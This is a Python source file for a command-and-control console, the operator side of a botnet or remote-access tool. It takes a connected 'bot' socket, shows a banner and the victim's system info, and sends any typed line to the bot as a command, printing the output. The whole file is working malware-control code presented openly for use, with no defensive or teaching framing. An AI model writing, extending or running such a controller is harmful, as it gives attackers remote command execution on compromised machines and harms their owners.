import cmd
import socket
from colorama import Fore, Style, init

init(autoreset=True)

class C2Console(cmd.Cmd):
    prompt = Fore.YELLOW + 'C2 > ' + Style.RESET_ALL

    def __init__(self, client_socket, addr, bot_info):
        super().__init__()
        self.client = client_socket
        self.addr = addr

        ascii_art = r"""
                                   @        @                              
                       @           @@       @@      @                  
                       -@@@         #@@@@#  @%@%    @#                
                         =@@@@      @@@@@@@   @@@* -@@%              
                           -@@@@@@@@@   %@@@@@- :@@@@@@@#           
                         --==++*@@@@@@@#  @@@@@@%   *@   @@        
                .=#@@@@@@@@@@@@@@@@@@@@@@:                 @@@      
                       =@@@@@@@@@@@@@@@@%                    @@    
                          =@@@@@@@@@@@@@.   -..               @@    
                  :#@@@@@@@@@@@@@@@%+.          *+-            %@    
             .#*****#%@@@@@@@@@@#-...             :%@@%.        @#   
                         @@@@@@@@@@*                -@*XX@      -@:  
                      %@@@@@@@@@@@@@@               :@@XXX@@*+%@@+  
                 +@@@@@@@@@@@@@@@@@@@                 @@@@@@@@@@@   
            .=#@@@@@@@@@@@@@@@@@@@@@                   =@@@@@@@@@@@ 
                    @@@@@@@@@@@@@@@                @@@@@@@@@@@@@@@@@
                *@@@@@@@@@@====#@@@@%@@-+=       +%@@@@@@@@@@@@@@@@@@
             #@@@@-                 %@@=@:     -*@@@@@@@@    @@@@@@@@
          +@@@.                       %@@@-    #*@@@@@@         @@@@
        %%.     .====+-  ===-.          @@@@@: @@@@@@@%          @@@ 
     -=    .*@@@@+%@@+=+%@@@=::::       %@@@@@ #@@@@@@%           @  
        :@@@@@@@@@@   @    %@@@@@#@      %@@@#  @@@@@@@@             
      %@@@@@@    *   @*   :#.     @@     @@@@@* %@@@@@@@            
    #@@@@@@@@@     @@@    %  @   @@#     @@@@@ %@@@@@@@@            
   @@@@@@@@@#     @    @@@%   @@@@.     @@@@@@@@@::@@@@                      
        """
        print(Fore.GREEN + ascii_art)
        print(Fore.YELLOW + "[*] Bot connected with system info:")
        print(Fore.CYAN + bot_info)
        print(Fore.LIGHTBLACK_EX + f"[+] Connection from {self.addr[0]}:{self.addr[1]}")

    def do_exit(self, arg):
        """Exit the C2 session."""
        self.client.send(b"exit")
        print(Fore.YELLOW + "[*] Exiting...")
        return True

    def default(self, line):
        """Send any typed command to the bot"""
        try:
            self.client.send(line.encode())
            result = self.client.recv(4096).decode()
            print(result)
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")

    def do_clear(self, arg):
        """Clear the screen (works on Unix/Windows)."""
        import os
        os.system('cls' if os.name == 'nt' else 'clear')
